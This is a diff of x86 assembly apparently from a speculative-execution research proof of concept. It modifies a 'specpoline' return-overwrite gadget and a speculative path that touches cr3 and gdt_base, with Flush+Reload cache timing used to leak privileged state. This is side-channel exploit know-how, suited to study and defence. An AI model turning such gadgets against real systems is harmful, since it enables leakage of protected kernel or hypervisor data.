@@ -18,7 +18,7 @@ SECTION .data
 
     ;Timings array
     timings         TIMES 256           dd 0
- 
+
 SECTION .code
 
     ;\ /\ /\ /                                                         \ /\ /\ /
@@ -26,17 +26,11 @@ SECTION .code
     ;/ \/ \/ \                                                         / \/ \/ \
     
     specpoline:
-        lea rax, [leak.profile]
-
         xorps xmm0, xmm0
-        TIMES 10 sqrtpd xmm0, xmm0
+        TIMES 40 sqrtpd xmm0, xmm0
 
-        %ifdef ARCH_STORE
-            mov DWORD [buffer], 241     ;Store in the first line
-        %endif
-
-        ;add rsp, 8
-        mov QWORD [rsp], rax
+        movq rbx, xmm0
+        mov QWORD [rsp+rbx], rax
         ret
 
  
@@ -111,18 +105,21 @@ SECTION .code
         ;Flush the F+R lines
         call flush
 
-        ;Unaligned stack, don't mind
-        ;;lea rax, [.profile]
-        ;;push rax
+        ;Prepare some reg and touch some line to make the speculative path feasable
+        lea rsi, [buffer]
+        movzx eax, BYTE [gdt_base]
+        lfence
+
+        ;Specpoline
+        lea rax, [leak.profile]
         call specpoline
 
         ;O.O 0
         ; o o o SPECULATIVE PATH
         ;0.0 O
 
-        %ifdef SPEC_STORE
-            mov DWORD [buffer], 241        ;Just a number
-        %endif
+        mov rbx, cr3
+        mov ebx, DWORD [rsi]
 
         ud2                             ;Stop speculation
 
